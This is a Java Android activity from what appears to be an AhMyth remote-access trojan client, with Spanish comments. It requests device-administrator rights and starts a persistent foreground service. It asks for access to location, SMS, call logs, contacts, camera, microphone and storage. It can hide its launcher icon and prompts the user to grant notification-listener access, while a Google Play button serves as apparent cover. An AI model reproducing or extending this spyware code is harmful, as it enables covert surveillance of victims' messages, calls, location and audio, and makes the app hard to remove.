package ahmyth.mine.king.ahmyth;

import android.Manifest;
import android.app.AlertDialog;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.text.TextUtils;
import android.view.View;
import android.widget.Switch;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

public class MainActivity extends AppCompatActivity {

    private static final int REQUEST_PERMISSIONS_ALL = 101;
    private DevicePolicyManager devicePolicyManager;
    private ComponentName componentName;
    private SharedPreferences sharedPreferences;

    // Lista de TODOS los permisos que necesita tu app
    private static final String[] PERMISOS_APP = {
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.READ_SMS,
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        MainService.startService(this);
        setContentView(R.layout.activity_main);

        componentName = new ComponentName(this, AdminReceiver.class);
        devicePolicyManager = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);

        // Solicitar privilegios de admin de dispositivo si no está activo
        if (!devicePolicyManager.isAdminActive(componentName)) {
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName);
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                    getString(R.string.device_admin_explanation));
            startActivity(intent);
        }

        // 🚨 Pedir TODOS los permisos en tiempo de ejecución (Android 6+)
        pedirPermisosSiNecesario();

        // Inicia el servicio principal en primer plano
        Intent serviceIntent = new Intent(this, MainService.class);
        ContextCompat.startForegroundService(this, serviceIntent);

        // Permite ocultar el icono si el Android es <= Pie (9)
        if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.P) {
            Switch hideIconSwitch = findViewById(R.id.switch1);
            hideIconSwitch.setVisibility(View.VISIBLE);

            sharedPreferences = getSharedPreferences("AppSettings", Context.MODE_PRIVATE);
            final SharedPreferences.Editor editor = sharedPreferences.edit();

            hideIconSwitch.setOnCheckedChangeListener((buttonView, isChecked) -> {
                editor.putBoolean("hidden_status", isChecked);
                editor.apply();
                if (isChecked) hideAppIcon();
            });

            boolean hiddenStatus = sharedPreferences.getBoolean("hidden_status", false);
            hideIconSwitch.setChecked(hiddenStatus);
            if (hiddenStatus) hideAppIcon();
        }

        // Verifica permiso de notificaciones
        checkNotificationPermission();
    }

    private void pedirPermisosSiNecesario() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            boolean faltanPermisos = false;
            for (String permiso : PERMISOS_APP) {
                if (ContextCompat.checkSelfPermission(this, permiso) != PackageManager.PERMISSION_GRANTED) {
                    faltanPermisos = true;
                    break;
                }
            }
            if (faltanPermisos) {
                ActivityCompat.requestPermissions(this, PERMISOS_APP, REQUEST_PERMISSIONS_ALL);
            }
        }
    }

    // Maneja la respuesta de permisos
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQUEST_PERMISSIONS_ALL) {
            for (int i = 0; i < permissions.length; i++) {
                if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
                    Toast.makeText(this, "Permiso requerido: " + permissions[i], Toast.LENGTH_LONG).show();
                }
            }
        }
    }

    private void hideAppIcon() {
        getPackageManager().setComponentEnabledSetting(
            getComponentName(),
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        );
    }

    /**
     * Comprueba si nuestro listener de notificaciones está activo,
     * y si no, abre ajustes para activarlo.
     */
    private void checkNotificationPermission() {
        String enabledListeners = Settings.Secure.getString(
            getContentResolver(),
            "enabled_notification_listeners"
        );
        boolean isEnabled = !TextUtils.isEmpty(enabledListeners)
            && enabledListeners.contains(getPackageName());
        if (!isEnabled) {
            new AlertDialog.Builder(this)
                .setTitle("Permiso de Notificaciones")
                .setMessage("Para que AhMyth lea notificaciones, debes activarlo en Ajustes.")
                .setPositiveButton("Ir a Ajustes", (dialog, which) ->
                    startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
                )
                .setNegativeButton("Cancelar", null)
                .show();
        }
    }

    public void openGooglePlay(View view) {
        Intent intent = new Intent(Intent.ACTION_VIEW,
            Uri.parse("https://play.google.com/store/apps"));
        startActivity(intent);
    }
}